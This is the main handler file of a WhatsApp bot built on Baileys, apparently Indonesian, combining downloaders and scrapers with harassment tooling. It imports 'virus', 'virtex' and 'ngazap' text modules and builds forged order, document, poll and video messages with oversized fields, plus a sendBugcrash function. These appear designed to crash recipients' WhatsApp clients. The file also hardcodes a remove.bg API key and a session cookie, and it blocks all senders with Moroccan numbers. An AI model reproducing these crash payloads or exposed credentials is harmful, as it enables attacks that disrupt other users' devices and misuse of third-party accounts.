require('./settings')
require('./lib/funclist')
const { modul } = require('./module');
const { axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/list')
const { buttonvirus } = require('./scrape/buttonvirus')
const { buttonvirus2 } = require('./scrape/buttonvirus2')
const { ngazap } = require('./scrape/ngazap')
const { virtex } = require('./scrape/virtex')
const { virus } = require('./scrape/virus')
const { philips } = require('./scrape/philips')
const { santed } = require('./lib/santed')
const { antiSpam } = require('./lib/antispam')
const { jadibot, conns } = require('./jadibot')
const { color, bgcolor } = require('./lib/color')
const { uptotelegra } = require('./scrape/upload')
const { dafontSearch, dafontDown } = require('./scrape/dafont')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess')
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const kirleys = require('@adiwajshing/baileys')
const vm = require('node:vm')
const audionye = fs.readFileSync('./y.mp3')
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'))
const pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const dblist = JSON.parse(fs.readFileSync('./database/listall.json'))

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

module.exports = GpStore = async (GpStore, m, chatUpdate, store) => {
try {
        const gakbisaowner = `${ownerNomor}@s.whatsapp.net`
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const content = JSON.stringify(m.message)
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await GpStore.decodeJid(GpStore.user.id)
        const itsMeGpStore = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		const dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')   
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const tahunBaru = new Date('January 1, 2023 00:00:00')
        const sekarang = new Date().getTime()
        const Selisih = tahunBaru - sekarang
        const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
        const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const jmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60))
        const jdetik = Math.floor( Selisih % (1000 * 60) / 1000)
        const idulFitri = new Date('April 22, 2023 00:00:00')
        const ayeuna = new Date().getTime()
        const ceIroh = idulFitri - ayeuna
        const hahari = Math.floor( ceIroh / (1000 * 60 * 60 * 24));
        const hajam = Math.floor( ceIroh % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const hamenit = Math.floor( ceIroh % (1000 * 60 * 60) / (1000 * 60))
        const hadetik = Math.floor( ceIroh % (1000 * 60) / 1000)
        const idulAdha = new Date('Juni 29, 2023 00:00:00')
        const nembe = new Date().getTime()
        const ceDadah = idulAdha - nembe
        const hihari = Math.floor( ceDadah / (1000 * 60 * 60 * 24));
        const hijam = Math.floor( ceDadah % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const himenit = Math.floor( ceDadah % (1000 * 60 * 60) / (1000 * 60))
        const hidetik = Math.floor( ceDadah % (1000 * 60) / 1000)
        const UltahCreator = new Date('Januari 19, 2023 00:00:00')
        const CreatorGpStoreti = new Date().getTime()
        const GpStoreBotWA = UltahCreator - CreatorGpStoreti
        const GpStorehari = Math.floor( GpStoreBotWA / (1000 * 60 * 60 * 24));
        const GpStorejam = Math.floor( GpStoreBotWA % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
        const GpStoremenit = Math.floor( GpStoreBotWA % (1000 * 60 * 60) / (1000 * 60))
        const GpStoredetik = Math.floor( GpStoreBotWA % (1000 * 60) / 1000)
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await GpStore.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(sender)
    	const isUser = pendaftar.includes(sender)
    	const banUser = await GpStore.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
}
} catch (err) {
console.error(err)
}

if (!GpStore.public) {
if (!m.key.fromMe) return
}

var mdu = ['red','green','yellow','blue','magenta','cyan','white']
var halalu = mdu[Math.floor(Math.random() * mdu.length)]
var mdo = ['red','green','yellow','blue','magenta','cyan','white']
var halalo = mdo[Math.floor(Math.random() * mdo.length)]
var mdi = ['red','green','yellow','blue','magenta','cyan','white']
var halali = mdi[Math.floor(Math.random() * mdi.length)]
var mda = ['red','green','yellow','blue','magenta','cyan','white']
var halala = mda[Math.floor(Math.random() * mda.length)]
var mde = ['red','green','yellow','blue','magenta','cyan','white']
var halale = mde[Math.floor(Math.random() * mde.length)]

if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(' - 𝙺𝚛𝚒𝚜𝙱𝚘𝚝𝚣-𝙼𝙳 '), color(`[ PESAN ]`, `${halalu}`), color(`FROM`, `${halalo}`), color(`${pushname}`, `${halali}`), color(`Text :`, `${halala}`), color(`${body}`, `${halale}`))
}

if (isCmd && !isUser) {
pendaftar.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
}

if (isCmd && antiSpam.isFiltered(from) && !m.isGroup) {
console.log(color('[SPAM]', 'red'), color(wib, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
return m.reply('�? �? 」Sabar 𝙰𝚗𝚓𝚊𝚢 /Command')
}
        
if (isCmd && antiSpam.isFiltered(from) && m.isGroup) {
console.log(color('[SPAM]', 'red'), color(wib, 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
return m.reply('�? �? 」Sabar Bang 5 Detik/Command')
}

if (isCmd && !itsMeGpStore) antiSpam.addFilter(from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

if (m.sender.startsWith('212')) return GpStore.updateBlockStatus(m.sender, 'block')
if (m.key.remoteJid == 'status@broadcast') return GpStore.sendReadReceipt(from, m.sender, [m.key.id])

async function sendGpStoreMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await GpStore.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const sendSticker = (pesan) => {
GpStore.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

try {
ppimg = await GpStore.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppimg = 'https://telegra.ph/file/8441f8eb9faafc71eaadf.jpg'
}
ppnyaimg = await reSize(ppimg, 300, 300)

const sendvn = (teks) => {
GpStore.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

for (let anju of vnnye) {
if (budy === anju) {
let buffer = fs.readFileSync(`./database/Audio/${anju}.mp3`)
sendvn(buffer)
}
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `GpStore Bot WhatsApp`, 
"jpegThumbnail": ppnyaimg
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '62858428854987@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: ppnyaimg } } }

const troli = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
message: {
orderMessage: {
itemCount : 999999999999999999,
status: 99999999999999999999,
surface : 9999999999999999,
message: virus,
orderTitle: virus,
thumbnail: ppnyaimg,
sellerJid: '0@s.whatsapp.net'
},
},
};

const reply = (teks) => {
GpStore.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : repPy })
}

const banRep = () => {
GpStore.sendMessage(m.chat, {
text:`Maaf Anda Sudah Di Banned Silahkan Chat @${creator.split("@")[0]} Untuk Membuka Nya`,
mentions: [creator],
},
{
quoted:m
})
}

if (isCmd && isBanned) {
return banRep()
}

const crsh = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `GpStore Bot WhatsApp${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

let list = []
for (let i of owner) {
list.push({
displayName: await GpStore.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await GpStore.getName(i + '@s.whatsapp.net')}\n
FN:${await GpStore.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

const voll = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": {
"pollCreationMessage": {
"name": `GpStore Bot ${virus}${virtex(prefix)}`,
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SALAM DARI GpStore BOT"
	}
],
"selectableOptionsCount": 5
}}}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: 'GpStore Bot',
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestmentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: 'Creator GpStore'
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "USD"
			}
		}
	}
}

const gifes = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
},
"message": { 
"videoMessage": { 
"title": `${virtex(prefix)}`,
"h": `${virus}`,
'duration': '99999', 
'gifPlayback': 'true', 
'caption': `${virus}${virtex(prefix)}`,
'jpegThumbnail': ppnyaimg
}}}

const vien = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"orderMessage": {
"orderId": "594071395007984",
"thumbnail": ppnyaimg,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `GpStore Bot WhatsApp${ngazap(prefix)}`,
"orderTitle": "GpStore Bot WhatsApp${ngazap(prefix)}",
"sellerJid": "62858428854987@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
}}}

let rn = ['recording','composing']
let jd = rn[Math.floor(Math.random() * rn.length)];

if (command) {
GpStore.sendPresenceUpdate(jd, from)
GpStore.readMessages([m.key])
}

function simpan(path, buff) {
    fs.writeFileSync(path, buff)
    return path
}
function getRandom(ext) {
    ext = ext || ""
    return `${Math.floor(Math.random() * 100000)}.${ext}`
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await GpStore.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: m })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await GpStore.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

async function sendPoll(jid, text, list) {
GpStore.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function bygbt(text) {
GpStore.sendMessage(text, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "24yjkNG4jrXeh1WcMdMJMWD2",
    ...form.getHeaders()
  }
})
return res.data
}

async function getFile(media) {
        let data = Buffer.isBuffer(media) ? media : isUrl(media) ? await ( await fetch(media)).buffer() : fs.existsSync(media) ? fs.readFileSync(media) : /^data:.*?\/.*?;base64,/i.test(media) ? Buffer.from(media.split(",")[1]) : null
        if (!data) return new Error("Result is not a buffer")
        let type = await FileType.fromBuffer(data) || {
          mime: "application/octet-stream",
          ext: ".bin"
        }
        return {
          data,
          ...type
        }
      }

async function sendFile(jid, media, options={}) {
        let file = await getFile(media)
        let mime = file.ext, type
        if (mime == "mp3") {
          type = "audio"
          options.mimetype = "audio/mpeg"
          options.ptt = options.ptt || false
        }
        else if (mime == "jpg" || mime == "jpeg" || mime == "png") type = "image"
        else if (mime == "webp") type = "sticker"
        else if (mime == "mp4") type = "video"
        else type = "document"
        return GpStore.sendMessage(jid, { [type]: file.data, ...options }, { ...options })
      }

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function genProfile(GpStore, m) {
   let font = await Jimp.loadFont('./name.fnt'), 
     mask = await Jimp.read('https://i.imgur.com/552kzaW.png'), 
     welcome = await Jimp.read("https://telegra.ph/file/81260a8b9e8cff26d2b48.jpg"), 
     avatar = await Jimp.read(await GpStore.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')), 
     status = (await GpStore.fetchStatus(m.sender).catch(console.log) || {}).status?.slice(0, 30) || 'Not Detected' 
     await avatar.resize(460, 460) 
     await mask.resize(460, 460) 
     await avatar.mask(mask) 
     await welcome.resize(welcome.getWidth(), welcome.getHeight()) 
     await welcome.print(font, 550, 180, 'Nama:') 
     await welcome.print(font, 650, 255, m.pushName.slice(0, 25)) 
     await welcome.print(font, 550, 340, 'Bio:') 
     await welcome.print(font, 650, 415, status) 
     await welcome.print(font, 550, 500, 'Nomor:') 
     await welcome.print(font, 650, 575, PhoneNumber('+' + m.sender.split('@')[0]).getNumber('international')) 
     return await welcome.composite(avatar, 50, 170).getBufferAsync('image/png') 
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
                hasil.push({
                    link: $(h).find('a').attr('href'),
                    gambar: $(h).find('img').attr('data-src'),
                    karakter: $(h).find('div.char-name').text().trim(),
                    anime: $(h).find('div.anime-title').text().trim(),
                    episode: $(h).find('div.meta').text(),
                    up_at: $(h).find('small.meta').text(),
                    quotes: $(h).find('div.quote').text().trim()
                })
            })
            resolve(hasil)
        }).catch(reject)
    })
}

async function cerpen (category) {
	return new Promise(async (resolve, reject) => {
        let title = category.toLowerCase().replace(/[()*]/g, "")
        let judul = title.replace(/\s/g, "-")
        let page = Math.floor(Math.random() * 5)
        axios.get('http://cerpenmu.com/category/cerpen-'+judul+'/page/'+page)
        .then((get) => {
            let $ = cheerio.load(get.data)
            let link = []
            $('article.post').each(function (a, b) {
                link.push($(b).find('a').attr('href'))
            })
            let random = link[Math.floor(Math.random() * link.length)]
            axios.get(random)
            .then((res) => {
                let $$ = cheerio.load(res.data)
                let hasil = {
                    title: $$('#content > article > h1').text(),
                    author: $$('#content > article').text().split('Cerpen Karangan: ')[1].split('Kategori: ')[0],
                    kategori: $$('#content > article').text().split('Kategori: ')[1].split('\n')[0],
                    lolos: $$('#content > article').text().split('Lolos moderasi pada: ')[1].split('\n')[0],
                    cerita: $$('#content > article > p').text()
                }
                resolve(hasil)
            })
        })
    })
}

async function tiktokdl(url) {
    try {
        const tokenn = await axios.get("https://downvideo.quora-wiki.com/tiktok-video-downloader#url=" + url);
        let a = cheerio.load(tokenn.data);
        let token = a("#token").attr("value");
        const param = {
            url: url,
            token: token,
        };
        const { data } = await axios.request("https://downvideo.quora-wiki.com/system/action.php", {
                method: "post",
                data: new URLSearchParams(Object.entries(param)),
                headers: {
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
                    "referer": "https://downvideo.quora-wiki.com/tiktok-video-downloader",
                },
            }
        );
        return {
            status: 200,
            title: data.title,
            thumbnail: "https:" + data.thumbnail,
            duration: data.duration,
            media: data.medias,
        };
    } catch (e) {
        return e
    }
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `GpStore`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
                hasil.push({
                    title: $(b).find('header > h2').text(),
                    link: $(b).find('header > h2 > a').attr('href'),
                    category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                    share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                    views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                    type: $(b).find('source').attr('type') || 'image/jpeg',
                    video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                    video_2: $(b).find('video > a').attr('href') || ''
                })
            })
            resolve(hasil)
        })
    })
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function sendBugcrash(jid, title, description, footer, thumbnail, ownerBusines, produk, productIdImg) {
let prod = {
listMessage: {
title: title,
description: description,
listType: 2,
productListInfo: {
productSections: [{
title: title,
products: produk
}],
headerImage: {
productId: productIdImg,
jpegThumbnail: thumbnail
},
businessOwnerJid: ownerBusines
},
footerText: footer,
}
}
let progene = await generateWAMessageFromContent(jid, prod, { quoted : troli })
return GpStore.relayMessage(progene.key.remoteJid, progene.message, {
messageId: ""
})
}

async function replyprem(teks) {
    let buttons = [
    { buttonId: '.buypremium', buttonText: { displayText: '⬆️ Upgrade Premium' }, type: 1 }
    ]
